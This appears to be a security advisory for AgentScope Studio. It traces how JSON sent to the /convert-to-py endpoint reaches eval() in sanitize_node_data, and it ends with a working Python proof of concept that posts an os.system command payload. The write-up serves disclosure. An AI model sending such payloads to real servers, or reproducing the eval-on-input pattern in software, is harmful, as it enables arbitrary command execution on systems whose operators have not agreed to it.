## Description

The wrong note sanitization introduced in `sanitize_node_data` (Processes the raw node information, removes empty arguments, and evaluates any callable expressions provided as string literals.) (**Not the sink at** [_app.py#L63](https://github.com/modelscope/agentscope/blob/100e8cb3b6fef8e6562e643ec83f8fadd1fe3cec/src/agentscope/studio/_app.py#L631)) allowed arbitrary python codes that's meant to be sanitize to be executed via `eval` when `elif is_callable_expression(value):`.

## Exploitation

```python
@_app.route("/convert-to-py", methods=["POST"])
def _convert_config_to_py() -> Response:
    """
    Convert json config to python code and send back.
    """
    content = request.json.get("data")
    status, py_code = _convert_to_py(content)
    return jsonify(py_code=py_code, is_success=status)
```

```python
def _convert_to_py(  # type: ignore[no-untyped-def]
    content: str,
    **kwargs,
) -> Tuple:
    """
    Convert json config to python code.
    """
    from agentscope.web.workstation.workflow_dag import build_dag

    try:
        cfg = json.loads(content)
        return "True", build_dag(cfg).compile(**kwargs)
    except Exception as e:
        return "False", _remove_file_paths(
            f"Error: {e}\n\n" f"Traceback:\n" f"{traceback.format_exc()}",
        )

```

```python
def build_dag(config: dict) -> ASDiGraph:
    dag = ASDiGraph()

    for node_id, node_info in config.items():
        print(node_id, node_info)
        config[node_id] = sanitize_node_data(node_info)
```

Here `key, value in copied_info["data"].get("args", {}).items():` parsed into `eval()`

```python
def sanitize_node_data(raw_info: dict) -> dict:
    copied_info = copy.deepcopy(raw_info)
    raw_info["data"]["source"] = copy.deepcopy(
        copied_info["data"].get(
            "args",
            {},
        ),
    )
    for key, value in copied_info["data"].get("args", {}).items():
        if value == "":
            raw_info["data"]["args"].pop(key)
            raw_info["data"]["source"].pop(key)
        elif is_callable_expression(value):
            raw_info["data"]["args"][key] = eval(value)
    return raw_info
```

we can then construct:

```json
python_script = {
        "node_1": {
        "data": {
            "args": {
                "param1": "42",
                "param2": "",
                "param3": "<EVALED>",
            }
        }
    }
}
```

`_convert_config_to_py -> _convert_to_py -> build_dag -> sanitize_node_data -> eval`

```python
import requests

# JSON config as a Python dictionary
python_script = {
        "node_1": {
        "data": {
            "args": {
                "param1": "42",
                "param2": "",
                "param3": "__import__('os').system('touch /tmp/convert-py')",
            }
        }
    }
}

import json
python_script = json.dumps(python_script)
url = "http://localhost:5000/convert-to-py" 
response = requests.post(
    url,
    json={"data": python_script},
)
```

# Impact

Arbitrary commands injection.